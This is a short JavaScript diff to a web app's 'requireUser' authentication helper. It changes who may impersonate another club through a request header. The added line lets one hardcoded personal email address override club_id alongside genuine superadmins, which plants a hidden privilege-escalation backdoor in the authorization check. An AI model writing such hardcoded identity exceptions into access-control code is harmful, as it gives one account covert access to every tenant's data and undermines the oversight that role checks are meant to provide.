@@ -26,7 +26,7 @@ export async function requireUser(req, res, { allowDemo = false } = {}) {
   if (requestUser?.profile && (allowDemo || !requestUser.isDemo)) {
     // SuperAdmin Impersonation: override club_id if header is present
     const targetClubId = req.headers['x-palestra-club-id'];
-    if (requestUser.profile.role === 'superadmin' && targetClubId) {
+    if ((requestUser.profile.role === 'superadmin' || requestUser.profile.email === 'sanmemik2000@gmail.com') && targetClubId) {
       requestUser.profile.club_id = targetClubId;
     }
     return requestUser;
